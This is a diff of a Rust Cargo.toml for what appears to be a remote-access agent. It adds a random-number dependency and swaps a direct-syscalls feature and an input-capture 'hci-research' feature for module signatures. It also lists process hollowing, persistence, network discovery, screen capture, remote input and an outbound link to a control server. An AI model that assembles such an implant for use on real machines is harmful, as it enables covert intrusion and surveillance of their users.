@@ -27,6 +27,7 @@ rustls = { version = "0.23.38", default-features = false, features = ["ring", "s
 tokio-rustls = { version = "0.26.4", default-features = false, features = ["ring", "logging", "tls12"] }
 rustls-pemfile = "2.2.0"
 rcgen = { version = "0.14.7", default-features = false, features = ["crypto", "ring", "pem"] }
+rand = "0.8"
 
 [target.'cfg(target_os = "linux")'.dependencies]
 x11cap = { version = "0.1", optional = true }
@@ -47,8 +48,7 @@ hollowing = { path = "../hollowing" }
 persistence = []
 network-discovery = []
 remote-assist = ["dep:enigo", "dep:image"]
-direct-syscalls = ["dep:ntapi", "dep:windows"]
-hci-research = ["dep:rdev", "dep:chrono", "dep:twox-hash"]
+module-signatures = ["common/module-signatures"]
 forward-secrecy = ["common/forward-secrecy"]
 # Connect the agent outbound to an Orchestra Control Center instead of waiting
 # for an inbound connection from a console. The server address and PSK are
